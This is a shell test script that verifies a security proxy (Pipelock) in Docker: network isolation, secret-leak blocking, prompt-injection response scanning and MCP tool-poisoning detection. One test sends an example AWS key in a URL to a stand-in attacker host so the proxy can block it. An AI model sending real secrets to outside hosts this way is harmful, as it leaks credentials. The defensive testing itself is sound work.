#!/bin/sh
# Copyright 2026 Pipelock contributors
# SPDX-License-Identifier: Apache-2.0

# Pipelock quickstart verification: 5 tests proving isolation and scanning work.
# Runs inside the verify container (pipelock-init image: Alpine + /pipelock binary).
# Exit 0 = all pass, exit 1 = any fail. CI-friendly.
#
# Usage (from examples/quickstart/):
#   docker compose --profile verify up --abort-on-container-exit --exit-code-from verify
set -eu

PASS=0
FAIL=0
PIPELOCK_HOST="pipelock"
PIPELOCK_PORT="8888"
PIPELOCK="http://$PIPELOCK_HOST:$PIPELOCK_PORT"
ATTACKER="http://attacker:9999"

pass() { PASS=$((PASS + 1)); printf '\033[32m  [PASS]\033[0m %s\n' "$1"; }
fail() { FAIL=$((FAIL + 1)); printf '\033[31m  [FAIL]\033[0m %s\n' "$1"; }
step() { printf '\n\033[1m--- %s ---\033[0m\n' "$1"; }

# fetch_block <target-url>: print "status=<code>" and, when present,
# "reason=<X-Pipelock-Block-Reason>" for one /fetch request. A bare 403 does
# not show which check fired, so callers compare both lines. BusyBox wget exits
# on a 4xx before printing response headers, so this speaks HTTP over nc. The
# request side stays open until the response arrives (at most 10 seconds):
# closing it first reads as a cancelled request, which also returns 403.
fetch_block() {
  response="/tmp/pipelock-verify-response.$$"
  : >"$response"
  {
    printf 'GET /fetch?url=%s HTTP/1.1\r\nHost: %s:%s\r\nConnection: close\r\n\r\n' \
      "$1" "$PIPELOCK_HOST" "$PIPELOCK_PORT"
    waited=0
    while [ ! -s "$response" ] && [ "$waited" -lt 10 ]; do
      sleep 1
      waited=$((waited + 1))
    done
  } | nc -w 10 "$PIPELOCK_HOST" "$PIPELOCK_PORT" >"$response" 2>/dev/null || true
  # RFC 9112 section 2.1 ends the header section with an empty line.
  # A connection closed before that line supplies no complete block evidence.
  tr -d '\r' <"$response" | awk '
    { headers[NR] = $0 }
    /^$/ { for (i = 1; i < NR; i++) print headers[i]; exit }
  ' | sed -n \
    -e '1s/^HTTP\/[0-9]\.[0-9] \([0-9][0-9][0-9]\) .*/status=\1/p' \
    -e '/^$/q' \
    -e 's/^[Xx]-[Pp]ipelock-[Bb]lock-[Rr]eason: *\([^ ]*\)$/reason=\1/p'
  rm -f "$response"
}

# -- Test 0: CI verifies the binary came from the checked-out tree -----------
if [ -n "${PIPELOCK_VERIFY_COMMIT:-}" ]; then
  step "Test 0: Verify the mounted binary came from this checkout"
  VERSION_OUTPUT=$(/pipelock version 2>&1) || true
  if printf '%s\n' "$VERSION_OUTPUT" | grep -Fq "git commit: $PIPELOCK_VERIFY_COMMIT"; then
    pass "Pipelock binary matches commit $PIPELOCK_VERIFY_COMMIT"
  else
    fail "Pipelock binary does not match commit $PIPELOCK_VERIFY_COMMIT"
  fi
fi

# -- Test 1: Network isolation ------------------------------------------------
step "Test 1: Verify container cannot reach attacker network directly"
if wget -q -T 3 -O /dev/null "$ATTACKER/" 2>/dev/null; then
  fail "Reached attacker directly (network isolation is broken!)"
else
  pass "Direct connection to attacker failed (network isolation works)"
fi

# -- Test 2: Proxy works ------------------------------------------------------
step "Test 2: Fetch through pipelock proxy succeeds"
# Use a path that returns clean content with HTTP 200.
RESP=$(wget -q -T 10 -O - "$PIPELOCK/fetch?url=$ATTACKER/healthz" 2>/dev/null) || true
if printf '%s' "$RESP" | grep -Fq '"status_code":200' &&
  printf '%s' "$RESP" | grep -Fq '"content":"quickstart-upstream-ok\n"' &&
  printf '%s' "$RESP" | grep -Fq '"blocked":false'; then
  pass "Pipelock proxied request to attacker successfully"
else
  fail "Pipelock did not proxy the request (response: $RESP)"
fi

# -- Test 3: DLP catches secret exfiltration -----------------------------------
step "Test 3: DLP blocks secret in URL"
# AWS key split at regex boundary to avoid CI self-scan false positive.
# Only a 403 that names the DLP check counts as this block.
DLP_URL="$ATTACKER/?key=AKIA""IOSFODNN7EXAMPLE"
DLP_RESULT=$(fetch_block "$DLP_URL")
if [ "$DLP_RESULT" = "$(printf 'status=403\nreason=dlp_match')" ]; then
  pass "DLP blocked AWS key in URL (HTTP 403, dlp_match)"
else
  fail "DLP did not block the secret (got: $DLP_RESULT)"
fi

# -- Test 4: Response injection blocked -----------------------------------------
step "Test 4: Response scanning blocks injection"
# With action=block, pipelock returns HTTP 403 when injection is detected.
# As in Test 3, the 403 must name the response-scanning check.
INJ_RESULT=$(fetch_block "$ATTACKER/")
if [ "$INJ_RESULT" = "$(printf 'status=403\nreason=prompt_injection')" ]; then
  pass "Response injection blocked (HTTP 403, prompt_injection)"
else
  fail "Response injection not blocked (got: $INJ_RESULT)"
fi

# -- Test 5: MCP tool poisoning detected ---------------------------------------
step "Test 5: MCP scanning detects poisoned tool description"
printf '{"jsonrpc":"2.0","id":1,"method":"tools/list"}\n' | \
  /pipelock mcp proxy --config /config/pipelock.yaml \
    -- sh /mock-mcp-server.sh 2>/tmp/mcp-stderr.log >/dev/null || true
if grep -qE 'tool ".*":.*(Instruction Tag|Dangerous Capability|injection)' /tmp/mcp-stderr.log; then
  pass "Tool poisoning detected in MCP tools/list response"
else
  # Show stderr for debugging
  printf '  (stderr: %s)\n' "$(cat /tmp/mcp-stderr.log 2>/dev/null || echo 'empty')"
  fail "Tool poisoning not detected"
fi

# -- Summary -------------------------------------------------------------------
printf '\n\033[1m=== Results: %s passed, %s failed ===\033[0m\n\n' "$PASS" "$FAIL"
if [ "$FAIL" -gt 0 ]; then
  exit 1
fi
